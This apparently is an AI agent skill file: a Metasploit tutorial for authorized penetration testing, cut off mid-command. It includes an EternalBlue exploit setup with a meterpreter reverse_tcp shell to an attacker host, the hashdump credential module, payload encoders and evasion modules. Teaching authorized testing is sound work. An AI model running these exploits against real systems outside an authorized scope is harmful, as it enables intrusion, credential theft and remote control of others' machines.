# Metasploit Framework

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

## Purpose

Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.

## Prerequisites

### Required Tools
```bash
# Metasploit must already be installed before using this skill.
# Kali Linux usually ships with it preinstalled.
msfconsole --version
```

Installation varies by operating system and package source. Follow your platform's documented package-manager or vendor installation process before using this skill. Do not rely on an unpinned remote installer script from inside this skill.

If you want database-backed features such as workspace tracking, initialize `msfdb` using the instructions for your local installation. This skill assumes Metasploit is already available and does not require `sudo`, `systemctl`, or other privileged host-level setup steps.

### Required Knowledge
- Network and system fundamentals
- Understanding of vulnerabilities and exploits
- Basic programming concepts
- Target enumeration techniques

### Required Access
- Written authorization for testing
- Network access to target systems
- Understanding of scope and rules of engagement

Before running exploit modules, ask the user to confirm the exact target host, scope, and authorization state.

## Outputs and Deliverables

1. **Exploitation Evidence** - Screenshots and logs of successful compromises
2. **Session Logs** - Command history and extracted data
3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
4. **Post-Exploitation Artifacts** - Credentials, files, and system information

## Core Workflow

### Phase 1: MSFConsole Basics

Launch and navigate the Metasploit console:

```bash
# Start msfconsole
msfconsole

# Quiet mode (skip banner)
msfconsole -q

# Basic navigation commands
msf6 > help                    # Show all commands
msf6 > search [term]           # Search modules
msf6 > use [module]            # Select module
msf6 > info                    # Show module details
msf6 > show options            # Display required options
msf6 > set [OPTION] [value]    # Configure option
msf6 > run / exploit           # Execute module
msf6 > back                    # Return to main console
msf6 > exit                    # Exit msfconsole
```

### Phase 2: Module Types

Understand the different module categories:

```bash
# 1. Exploit Modules - Target specific vulnerabilities
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Payload Modules - Code executed after exploitation
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Auxiliary Modules - Scanning, fuzzing, enumeration
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Post-Exploitation Modules - Actions after compromise
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Obfuscate payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - No-operation padding for buffer overflows
msf6 > show nops

# 7. Evasion - Bypass security controls
msf6 > show evasion
```

### Phase 3: Searching for Modules

Find appropriate modules for targets:

```bash
# Search by name
msf6 > search eternalblue

# Search by CVE
msf6 > search cve:2017-0144

# Search by platform
msf6 > search platform:windows type:exploit

# Search by type and keyword
msf6 > search type:auxiliary smb

# Filter by rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Combined search
msf6 > search type:exploit platform:linux apache

# View search results columns:
# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description
```

### Phase 4: Configuring Exploits

Set up an exploit for execution:

```bash
# Select exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target host
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Set target port (if different from default)
msf6 exploit(...) > set RPORT 445

# View compatible payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host for reverse connection
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# View all options again to verify
msf6 exploit(...) > show options

# Check if target is vulnerable (if supported)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# or
msf6 exp
